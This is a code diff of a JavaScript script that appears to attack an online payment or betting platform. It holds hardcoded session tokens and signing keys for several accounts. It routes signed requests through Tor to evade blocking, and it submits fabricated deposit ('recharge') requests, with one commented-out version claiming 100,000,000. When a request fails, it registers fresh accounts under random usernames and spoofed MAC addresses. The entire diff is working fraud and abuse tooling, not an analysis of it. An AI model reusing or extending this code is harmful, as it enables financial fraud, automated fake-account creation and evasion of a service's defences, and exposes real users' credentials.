@@ -281,6 +281,22 @@ requirejs(['enc'],
     return (md5_WordToHex(a) + md5_WordToHex(b) + md5_WordToHex(c) + md5_WordToHex(d)).toLowerCase();
   };
 
+  let memberInfo = {
+    aCode: 3,
+    cCode: 9,
+    createTime: 1664627944000,
+    id: 169644,
+    isOnline: 1,
+    levelId: 1,
+    nickName: 'babi1113',
+    referralCode: '798960',
+    sKey: 'J53XY',
+    state: 1,
+    token: '169644|d63ee4eac3e131258c4081cddf7b607909e285896c7288fcfd180b13d6ef23e5|4',
+    type: 1,
+    userName: 'babi1113'
+  }
+
   function setT(options){
     options=options||{};
     options.headers["content-type"]="application/json";
@@ -290,28 +306,28 @@ requirejs(['enc'],
       var signa="";
       var signc=""
       // var menberInfo=JSON.parse($.getItem("user")||"{}").member||{};
-      var menberInfo= {
-        aCode: 5,
-        cCode: 10,
-        createTime: 1664550711000,
-        id: 169477,
-        isOnline: 1,
-        levelId: 1,
-        nickName: "coco1111",
-        referralCode: "895742",
-        sKey: "UZFBW",
-        state: 1,
-        token: "169477|58d568a44d0a6d573145aeb2c4f65ab138c606a09ad8095167f2c1eafc727fba|4",
-        type: 1,
-        userName: "coco1111"
-      }
+      // memberInfo= {
+      //   aCode: 5,
+      //   cCode: 10,
+      //   createTime: 1664550711000,
+      //   id: 169477,
+      //   isOnline: 1,
+      //   levelId: 1,
+      //   nickName: "coco1111",
+      //   referralCode: "895742",
+      //   sKey: "UZFBW",
+      //   state: 1,
+      //   token: "169477|58d568a44d0a6d573145aeb2c4f65ab138c606a09ad8095167f2c1eafc727fba|4",
+      //   type: 1,
+      //   userName: "coco1111"
+      // }
       // console.log(isMbers)
       // console.log(menberInfo)
       if(isMbers){
-        if(menberInfo.sKey){
-          sing=menberInfo.sKey+sing;
-          signa=suij(menberInfo.aCode||0).toUpperCase();
-          signc=suij(menberInfo.cCode||0).toUpperCase();
+        if(memberInfo.sKey){
+          sing=memberInfo.sKey+sing;
+          signa=suij(memberInfo.aCode||0).toUpperCase();
+          signc=suij(memberInfo.cCode||0).toUpperCase();
         }
       }
 
@@ -346,7 +362,7 @@ requirejs(['enc'],
 
   let phoneDigit = 5
   let firtNum = 1
-  let lastNum = 100000
+  let lastNum = 5
   let prefix = "peter"
 
   let arr = []
@@ -354,10 +370,12 @@ requirejs(['enc'],
   function createArr() {
     for (let i = firtNum; i < lastNum; i++) {
         let t = i.toString()
-        arr.push(prefix + String(i).padStart(phoneDigit, '0'));
+        // arr.push(prefix + String(i).padStart(phoneDigit, '0'));
+        arr.push(i)
     }
   }
   createArr()
+  console.log(arr)
 
   function genMac() {
     return "XX-XX-XX-XX-XX-XX".replace(/X/g, function() {
@@ -365,21 +383,27 @@ requirejs(['enc'],
     });
   }
 
+  function genUserName() {
+    return "XXXXXXXX".replace(/X/g, function() {
+      return "0123456789ABCDEFGHIKLMNOPQRSTVXYZ".charAt(Math.floor(Math.random() * 33))
+    });
+  }
+
   var tr = require('tor-request');
   // tr.TorControlPort.password = 'giraffe'
-  var request = require ( 'request' ); 
+  var request = require ('request'); 
 
 
   function processChunk() {
     if (arr.length === 0) {
-      createArr()
+      // createArr()
       console.log("================DONE !!!!====================")
-      processChunk()
+      // processChunk()
       // code that runs after the whole array is executed
     } else {
       // console.log('processing chunk');
       // pick 10 items and remove them from the array
-      const subarr = arr.splice(0, 1000)
+      const subarr = arr.splice(0, 2)
       for (const item of subarr) {
         doHeavyStuff(item)
       }
@@ -389,16 +413,57 @@ requirejs(['enc'],
   }
 
   processChunk()
-  // rechargeWithTor()
-
-  function doHeavyStuff(userName) {
-    // login()
-    // changePass()
-    rechargeWithTor()
+  // registration("babi1113")
+  // recharge()
+  function handleResp (err, res, body) {
+    if (!err && res.statusCode == 200) {
+      if (!body) { 
+        console.log("blocked !!!") 
+        return 
+      }
+      let resp = body.replace('"','');
+      resp = ajaxSuccess(resp)
+      console.log(resp)
+      return resp.status
+    }
   }
 
-  function registration(userName) {
-    mac = genMac()
+  function doHeavyStuff(userName) {
+    let status = ""
+    recharge(function(err, res, body) {
+      if (!err && res.statusCode == 200) {
+        if (!body) { 
+          console.log("blocked !!!") 
+          return 
+        }
+        let resp = body.replace('"','');
+        resp = ajaxSuccess(resp)
+        console.log(resp)
+        status = resp.status
+
+
+        // console.log(status)
+        if (status !== 1) {
+          registration()
+        }
+      }
+    })
+
+    // recharge().then(function (res) {
+    //   console.log(res)
+    // }, function (err) {
+    //   console.log(err)
+    // })
+
+    // console.log(status)
+    // if (status == 1) {
+    //   registration()
+    // }
+  }
+
+  function registration() {
+    let mac = genMac()
+    let userName = genUserName()
 
     let headers = {
       token: "",
@@ -428,26 +493,26 @@ requirejs(['enc'],
           return 
         }
         let resp = body.replace('"','');
-        console.log(ajaxSuccess(resp))
+        resp = ajaxSuccess(resp)
+        console.log(resp)  
+        memberInfo = resp.data
       }
     });
   }
 
-  // registration("coco1116")
 
-
-  function rechargeWithTor() {
+  function recharge(cb) {
     let headers = {
       "appid": "xj567",
       "content-type": "application/json",
       "mac": "A2-45-E2-3D-9C-1B",
       "osType": 3,
-      "token": "169477|58d568a44d0a6d573145aeb2c4f65ab138c606a09ad8095167f2c1eafc727fba|4",
+      "token": memberInfo.token,
       "version": 999
     }
 
     let data = {
-      bankId: 33,
+      bankId: 30,
       depositName: "dau tu",
       mac: "A2-45-E2-3D-9C-1B",
       payTime: "2022-10-01 09:16:44",
@@ -458,54 +523,45 @@ requirejs(['enc'],
     let options = {data: data, headers: headers, url: rechargeURL, type: "POST"}
     let payload = setT(options)
 
-     tr.request.post({url: rechargeURL, headers: headers, body: payload.data}, function (err, res, body) {
-        if (!err && res.statusCode == 200) {
-          if (!body) { 
-            console.log("blocked !!!") 
-            return 
-          }
-          let resp = body.replace('"','');
-          console.log(ajaxSuccess(resp))
-        }
-    });
+    return tr.request.post({url: rechargeURL, headers: headers, body: payload.data}, cb)
   }
 
-  function recharge() {
-    let headers = {
-      "appid": "xj567",
-      "content-type": "application/json",
-      "mac": "74-3A-99-06-C1-0C",
-      "osType": 3,
-      "token": "169431|d63ee4eac3e131258c4081cddf7b607909e285896c7288fcfd180b13d6ef23e5|4",
-      "version": 999
-    }
+  // function recharge() {
+  //   let headers = {
+  //     "appid": "xj567",
+  //     "content-type": "application/json",
+  //     "mac": "74-3A-99-06-C1-0C",
+  //     "osType": 3,
+  //     "token": "169431|d63ee4eac3e131258c4081cddf7b607909e285896c7288fcfd180b13d6ef23e5|4",
+  //     "version": 999
+  //   }
 
-    let data = {
-      bankId: 30,
-      depositName: "dau tu",
-      "mac": "74-3A-99-06-C1-0C",
-      "payTime": "2022-09-30 10:59:01", 
-      "rechargeTypeId": 11,
-      totalMoney: 100000000,
-    }
+  //   let data = {
+  //     bankId: 30,
+  //     depositName: "dau tu",
+  //     "mac": "74-3A-99-06-C1-0C",
+  //     "payTime": "2022-09-30 10:59:01", 
+  //     "rechargeTypeId": 11,
+  //     totalMoney: 100000000,
+  //   }
 
-    let options = {data: data, headers: headers, url: rechargeURL, type: "POST"}
-    let payload = setT(options)
+  //   let options = {data: data, headers: headers, url: rechargeURL, type: "POST"}
+  //   let payload = setT(options)
 
-    request({
-      headers: headers,
-      uri: rechargeURL,
-      body: payload.data,
-      method: 'POST'
-    }, function (err, res, body) {
-      if (!body) { 
-        console.log("blocked !!!") 
-        return 
-      }
-      let resp = body.replace('"','');
-      console.log(ajaxSuccess(resp))
-    });
-  }
+  //   request({
+  //     headers: headers,
+  //     uri: rechargeURL,
+  //     body: payload.data,
+  //     method: 'POST'
+  //   }, function (err, res, body) {
+  //     if (!body) { 
+  //       console.log("blocked !!!") 
+  //       return 
+  //     }
+  //     let resp = body.replace('"','');
+  //     console.log(ajaxSuccess(resp))
+  //   });
+  // }
 
   function changePass() {
 
